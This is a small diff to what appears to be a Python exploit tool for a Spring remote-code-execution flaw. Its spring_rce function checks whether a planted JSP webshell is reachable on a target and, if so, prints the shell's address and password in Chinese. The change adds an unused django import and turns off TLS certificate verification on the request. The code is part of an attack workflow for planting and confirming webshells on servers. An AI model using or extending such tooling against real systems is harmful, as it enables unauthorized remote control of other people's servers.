@@ -12,6 +12,7 @@ import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urljoin,quote
+from django.shortcuts import redirect
 
 import requests
 
@@ -154,7 +155,7 @@ def spring_rce(alive_url):
         try:
             shell_uri = shell_name + ".jsp"
             shell_url = urljoin(alive_url, shell_uri)
-            shell = requests.get(shell_url, timeout=15)
+            shell = requests.get(shell_url, timeout=15, verify=False, allow_redirects=False)
             if shell.status_code == 200:
                 print(shell_url + " 存在漏洞，shell地址为:" + shell_url + "\n")
                 print(f"shell密码为:" + random_passwd)
